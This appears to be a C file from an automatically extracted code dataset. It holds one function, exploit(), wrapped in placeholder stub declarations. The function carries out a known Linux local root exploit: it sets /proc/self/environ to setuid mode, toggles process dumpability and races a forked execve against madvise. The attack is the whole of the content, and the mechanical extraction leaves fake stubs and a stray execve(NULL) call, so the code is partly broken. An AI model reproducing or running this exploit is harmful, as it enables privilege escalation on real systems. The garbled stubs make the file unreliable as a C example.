
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int st_size; } ;


 int MADV_WILLNEED ;
 int MAP_ANONYMOUS ;
 void* MAP_FAILED ;
 int MAP_PRIVATE ;
 int MAP_SHARED ;
 int O_RDONLY ;
 int PROT_READ ;
 int PROT_WRITE ;
 int PR_SET_DUMPABLE ;
 int a ;
 int * c ;
 int chmod (char*,int) ;
 int e ;
 int error (char*) ;
 int execve (int *,int ,int ) ;
 int exit (int ) ;
 int fflush (int ) ;
 int fork () ;
 int fstat (int,struct stat*) ;
 int getpid () ;
 int madvise (void*,int,int ) ;
 int memset (void*,int ,int) ;
 int * mmap (int ,int,int,int,int,int ) ;
 int nice (int) ;
 int open (char*,int ) ;
 int prctl (int ,int,int ,int ,int ) ;
 int printf (char*,char*) ;
 int sched_yield () ;
 int sprintf (int *,char*,int) ;
 int stdout ;
 int * t ;
 int waitpid (int,int *,int ) ;

void
exploit (char *file)
{
  int i, fd;
  void *p;
  struct stat st;

  printf ("\ntrying to exploit %s\n\n", file);
  fflush (stdout);
  chmod ("/proc/self/environ", 04755);
  c = mmap (0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
  memset ((void *) c, 0, 4096);


  fd = open (file, O_RDONLY);
  fstat (fd, &st);
  p =
    (void *) mmap (0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
  if (p == MAP_FAILED)
    error ("mmap");
  prctl (PR_SET_DUMPABLE, 0, 0, 0, 0);
  sprintf (t, "/proc/%d/environ", getpid ());
  sched_yield ();
  execve (((void*)0), a, e);
  madvise (0, 0, MADV_WILLNEED);
  i = fork ();


  if (i)
    {
      (*c)++;
      !madvise (p, st.st_size, MADV_WILLNEED) ? : error ("madvise");
      prctl (PR_SET_DUMPABLE, 1, 0, 0, 0);
      sched_yield ();
    }
  else
    {
     nice(10);
     while (!(*c));
  sched_yield ();
      execve (t, a, e);
      error ("failed");
    }

  waitpid (i, ((void*)0), 0);
  exit (0);
}
